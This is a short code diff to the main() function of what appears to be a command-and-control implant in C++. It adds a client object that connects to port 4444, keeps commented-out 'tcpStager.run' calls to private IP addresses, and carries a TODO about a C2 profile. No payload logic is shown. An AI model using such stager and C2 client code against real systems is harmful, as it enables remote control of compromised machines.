@@ -6,6 +6,7 @@ int main()
     //Client client(config);
     //tcpStager.run("172.18.245.234", "4444");
     //tcpStager.run("10.0.0.86", "4444");
+	Client client;
     const char server_ip[] = "127.0.0.1";
     client.run(server_ip, "4444"); // TODO: add/replace with C2Profile Config param?
 
